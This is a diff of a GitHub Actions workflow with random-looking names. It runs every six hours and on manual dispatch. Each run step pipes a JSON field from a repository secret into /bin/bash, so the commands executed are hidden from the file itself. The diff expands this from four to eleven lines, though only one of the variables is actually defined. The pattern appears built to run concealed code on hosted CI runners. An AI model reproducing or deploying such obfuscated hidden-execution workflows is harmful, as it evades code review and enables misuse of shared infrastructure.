@@ -3,18 +3,27 @@ name: xuzhibai3856
 on:
   workflow_dispatch:
   schedule:
-    - cron: '52 3/6 * * *'
+    - cron: '36 0/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: xuzhibai3856
         env:
-          o4: ${{ secrets.o4 }}
+          dwacu9: ${{ secrets.dwacu9 }}
         run: |
-          echo $o4 | jq -r .pb66732 | /bin/bash
-          echo $wzvn0 | jq -r .oo77 | /bin/bash
-          echo $ceh38 | jq -r .d38 | /bin/bash
-          echo $nimt438 | jq -r .ah8713 | /bin/bash
+          echo $dwacu9 | jq -r .meln9698 | /bin/bash
+          echo $s81587 | jq -r .qdz983 | /bin/bash
+          echo $cpda6442 | jq -r .cvkbe600 | /bin/bash
+          echo $oqmz61 | jq -r .s84 | /bin/bash
+          echo $gztl58993 | jq -r .igje3683 | /bin/bash
+          echo $a41860 | jq -r .ez1 | /bin/bash
+          echo $hi9344 | jq -r .q71 | /bin/bash
+          echo $ak3309 | jq -r .dru374 | /bin/bash
+          echo $z43 | jq -r .obk367 | /bin/bash
+          echo $dstn179 | jq -r .ve76 | /bin/bash
+          echo $mehj52712 | jq -r .etjp84 | /bin/bash
 
